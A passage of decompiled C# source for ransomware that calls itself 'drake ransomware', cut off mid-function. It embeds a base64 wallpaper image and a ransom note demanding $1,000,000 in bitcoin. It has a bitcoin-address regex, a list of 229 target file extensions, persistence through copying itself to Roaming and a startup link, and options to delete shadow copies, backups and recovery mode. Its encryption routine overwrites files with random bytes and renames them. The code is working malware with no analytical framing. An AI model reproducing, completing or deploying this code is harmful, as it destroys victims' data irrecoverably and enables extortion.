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";

	public static string appMutexStartup = "1qw0ll8p9m8uezhqhyd";

	private static string droppedMessageTextbox = "read_it.txt";

	private static bool checkAdminPrivilage = false;

	private static bool checkdeleteShadowCopies = false;

	private static bool checkdisableRecoveryMode = false;

	private static bool checkdeleteBackupCatalog = false;

	public static string appMutexStartup2 = "17CqMQFeuB3NTzJ";

	public static string appMutex2 = appMutexStartup2 + appMutexRun2;

	public static string staticSplit = "bc";

	public static string appMutex = staticSplit + appMutexStartup + appMutexRun;

	public static readonly Regex appMutexRegex = new Regex("(?:[13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})");

	private static string[] messages = new string[1] { "Hello your files have been encrypted by the drake ransomware and pay $1000000 worth of bitcoin" };

	private static string[] validExtensions = new string[229]
	{
		".txt", ".jar", ".dat", ".contact", ".settings", ".doc", ".docx", ".xls", ".xlsx", ".ppt",
		".pptx", ".odt", ".jpg", ".mka", ".mhtml", ".oqy", ".png", ".csv", ".py", ".sql",
		".mdb", ".php", ".asp", ".aspx", ".html", ".htm", ".xml", ".psd", ".pdf", ".xla",
		".cub", ".dae", ".indd", ".cs", ".mp3", ".mp4", ".dwg", ".zip", ".rar", ".mov",
		".rtf", ".bmp", ".mkv", ".avi", ".apk", ".lnk", ".dib", ".dic", ".dif", ".divx",
		".iso", ".7zip", ".ace", ".arj", ".bz2", ".cab", ".gzip", ".lzh", ".tar", ".jpeg",
		".xz", ".mpeg", ".torrent", ".mpg", ".core", ".pdb", ".ico", ".pas", ".db", ".wmv",
		".swf", ".cer", ".bak", ".backup", ".accdb", ".bay", ".p7c", ".exif", ".vss", ".raw",
		".m4a", ".wma", ".flv", ".sie", ".sum", ".ibank", ".wallet", ".css", ".js", ".rb",
		".crt", ".xlsm", ".xlsb", ".7z", ".cpp", ".java", ".jpe", ".ini", ".blob", ".wps",
		".docm", ".wav", ".3gp", ".webm", ".m4v", ".amv", ".m4p", ".svg", ".ods", ".bk",
		".vdi", ".vmdk", ".onepkg", ".accde", ".jsp", ".json", ".gif", ".log", ".gz", ".config",
		".vb", ".m1v", ".sln", ".pst", ".obj", ".xlam", ".djvu", ".inc", ".cvs", ".dbf",
		".tbi", ".wpd", ".dot", ".dotx", ".xltx", ".pptm", ".potx", ".potm", ".pot", ".xlw",
		".xps", ".xsd", ".xsf", ".xsl", ".kmz", ".accdr", ".stm", ".accdt", ".ppam", ".pps",
		".ppsm", ".1cd", ".3ds", ".3fr", ".3g2", ".accda", ".accdc", ".accdw", ".adp", ".ai",
		".ai3", ".ai4", ".ai5", ".ai6", ".ai7", ".ai8", ".arw", ".ascx", ".asm", ".asmx",
		".avs", ".bin", ".cfm", ".dbx", ".dcm", ".dcr", ".pict", ".rgbe", ".dwt", ".f4v",
		".exr", ".kwm", ".max", ".mda", ".mde", ".mdf", ".mdw", ".mht", ".mpv", ".msg",
		".myi", ".nef", ".odc", ".geo", ".swift", ".odm", ".odp", ".oft", ".orf", ".pfx",
		".p12", ".pl", ".pls", ".safe", ".tab", ".vbs", ".xlk", ".xlm", ".xlt", ".xltm",
		".svgz", ".slk", ".tar.gz", ".dmg", ".ps", ".psb", ".tif", ".rss", ".key", ".vob",
		".epsp", ".dc3", ".iff", ".onepkg", ".onetoc2", ".opt", ".p7b", ".pam", ".r3d"
	};

	private static Random random = new Random();

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint action, uint uParam, string vParam, uint winIni);

	private static void Main(string[] args)
	{
		if (AlreadyRunning())
		{
			Environment.Exit(1);
		}
		if (checkSleep)
		{
			sleepOutOfTempFolder();
		}
		if (checkAdminPrivilage)
		{
			copyResistForAdmin(processName);
		}
		else if (checkCopyRoaming)
		{
			copyRoaming(processName);
		}
		if (checkStartupFolder)
		{
			addLinkToStartup();
		}
		lookForDirectories();
		if (checkAdminPrivilage)
		{
			if (checkdeleteShadowCopies)
			{
				deleteShadowCopies();
			}
			if (checkdisableRecoveryMode)
			{
				disableRecoveryMode();
			}
			if (checkdeleteBackupCatalog)
			{
				deleteBackupCatalog();
			}
		}
		if (checkSpread)
		{
			spreadIt(spreadName);
		}
		addAndOpenNote();
		SetWallpaper(base64Image);
		new Thread((ThreadStart)delegate
		{
			Run();
		}).Start();
	}

	public static void Run()
	{
		Application.Run((Form)(object)new driveNotification.NotificationForm());
	}

	private static void sleepOutOfTempFolder()
	{
		string directoryName = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		if (directoryName != folderPath)
		{
			Thread.Sleep(sleepTextbox * 1000);
		}
	}

	private static bool AlreadyRunning()
	{
		Process[] processes = Process.GetProcesses();
		Process currentProcess = Process.GetCurrentProcess();
		Process[] array = processes;
		foreach (Process process in array)
		{
			try
			{
				if (process.Modules[0].FileName == Assembly.GetExecutingAssembly().Location && currentProcess.Id != process.Id)
				{
					return true;
				}
			}
			catch (Exception)
			{
			}
		}
		return false;
	}

	public static byte[] random_bytes(int length)
	{
		Random random = new Random();
		length++;
		byte[] array = new byte[length];
		random.NextBytes(array);
		return array;
	}

	public static string RandomString(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < length; i++)
		{
			char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
			stringBuilder.Append(value);
		}
		return stringBuilder.ToString();
	}

	public static string RandomStringForExtension(int length)
	{
		if (encryptedFileExtension == "")
		{
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < length; i++)
			{
				char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
				stringBuilder.Append(value);
			}
			return stringBuilder.ToString();
		}
		return encryptedFileExtension;
	}

	public static string Base64EncodeString(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return Convert.ToBase64String(bytes);
	}

	public static string randomEncode(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return "<EncyptedKey>" + Base64EncodeString(RandomString(41)) + "<EncyptedKey> " + RandomString(2) + Convert.ToBase64String(bytes);
	}

	private static void encryptDirectory(string location)
	{
		try
		{
			string[] files = Directory.GetFiles(location);
			bool flag = true;
			for (int i = 0; i < files.Length; i++)
			{
				try
				{
					string extension = Path.GetExtension(files[i]);
					string fileName = Path.GetFileName(files[i]);
					if (!Array.Exists(validExtensions, (string E) => E == extension.ToLower()) || !(fileName != droppedMessageTextbox))
					{
						continue;
					}
					FileInfo fileInfo = new FileInfo(files[i]);
					fileInfo.Attributes = FileAttributes.Normal;
					if (fileInfo.Length < 2117152)
					{
						if (encryptionAesRsa)
						{
							EncryptFile(files[i]);
						}
					}
					else if (fileInfo.Length > 200000000)
					{
						Random random = new Random();
						int length = random.Next(200000000, 300000000);
						string @string = Encoding.UTF8.GetString(random_bytes(length));
						File.WriteAllText(files[i], randomEncode(@string));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					else
					{
						string string2 = Encoding.UTF8.GetString(random_bytes(Convert.ToInt32(fileInfo.Length) / 4));
						File.WriteAllText(files[i], randomEncode(string2));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					if (flag)
					{
						flag = false;
						File.WriteAllLines(location + "/" + droppedMessageTextbox, messages);
					}
				}
				catch
				{
				}
			}
